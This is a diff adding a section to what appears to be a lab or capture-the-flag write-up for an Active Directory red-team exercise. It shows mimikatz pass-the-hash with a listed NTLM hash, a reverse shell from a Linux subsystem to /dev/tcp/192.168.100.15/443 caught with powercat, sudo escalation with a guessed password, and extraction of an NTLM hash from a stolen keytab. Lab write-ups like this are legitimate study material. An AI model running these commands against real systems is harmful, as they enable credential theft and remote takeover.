@@ -323,6 +323,111 @@ mimikatz(commandline) # exit
 Bye!
 ```
 
+Impersonate Appmanager and access as local admin with Ubuntu VM permissions:
+
+```
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:it.gcb.local /user:appmanager /ntlm:2c5d4678b83e5de26dc0338a0fcf6245 /run:powershell"
+```
+
+Access with app manager
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> Enter-PSSession -ComputerName it-appsrv01
+[it-appsrv01]: PS C:\Users\appmanager\Documents> whoami
+it\appmanager
+[it-appsrv01]: PS C:\Users\appmanager\Documents> hostname
+it-appsrv01
+[it-appsrv01]: PS C:\Users\appmanager\Documents>
+```
+
+Spawn reverse shell from Ubuntu VM target machine:
+
+```
+C:\Ubuntu\ubuntu.exe run '/bin/bash -l > /dev/tcp/192.168.100.15/443 0<&1 2>&1'
+
+
+PS C:\tools> Import-Module .\powercat.ps1
+PS C:\tools> powercat -l -p 443 -v -t 99999
+VERBOSE: Set Stream 1: TCP
+VERBOSE: Set Stream 2: Console
+VERBOSE: Setting up Stream 1...
+VERBOSE: Listening on [0.0.0.0] (port 443)
+VERBOSE: Connection from [192.168.4.121] port  [tcp] accepted (source port 50527)
+VERBOSE: Setting up Stream 2...
+VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
+whoami
+appmanager
+id
+uid=1000(appmanager) gid=1000(appmanager) groups=1000(appmanager),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd)
+/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+appmanager@it-appsrv01:/mnt/c/Users/appmanager/Documents$ hostname
+hostname
+it-appsrv01
+appmanager@it-appsrv01:/mnt/c/Users/appmanager/Documents$ ifconfig
+ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:15:5d:6a:2c:45
+          inet addr:192.168.4.121  Bcast:192.168.4.255  Mask:255.255.255.0
+          inet6 addr: fe80::9224:5f1e:b50a:617c/64 Scope:Unknown
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Unknown
+          UP LOOPBACK RUNNING  MTU:1500  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0
+          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+
+``` 
+
+privilege escalation and extract keytab:
+
+```
+appmanager@it-appsrv01:/mnt/c/Users/appmanager/Documents$ sudo -s
+sudo -s
+[sudo] password for appmanager: appsrv
+
+Sorry, try again.
+[sudo] password for appmanager: appmanager
+
+root@it-appsrv01:/mnt/c/Users/appmanager/Documents# cd /root
+cd /root
+root@it-appsrv01:/root# ls -ltrh
+ls -ltrh
+total 0
+-rwxrwxrwx 1 appmanager appmanager 59 May 28  2019 sqlsrv02.keytab
+root@it-appsrv01:/root#
+```
+
+From kali attacker machine:
+
+```
+┌──(kali㉿kali)-[~/KeyTabExtract]
+└─$ ls -ltrh
+total 16K
+-rw-r--r-- 1 kali kali   59 May  4 11:18 sqlsrv02.keytab
+-rw-r--r-- 1 kali kali  499 May  4 18:54 README.md
+-rwxr-xr-x 1 kali kali 4.5K May  4 18:54 keytabextract.py
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/KeyTabExtract]
+└─$ ./keytabextract.py sqlsrv02.keytab 
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[!] Unable to identify any AES256-CTS-HMAC-SHA1 hashes.
+[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
+[+] Keytab File successfully imported.
+        REALM : it.gcb.local
+        SERVICE PRINCIPAL : sqlsvc/
+        NTLM HASH : 7782d820e5e5952b20b77a2240a03bbc
+
+```
+
 
 
 [back](./section1.html)
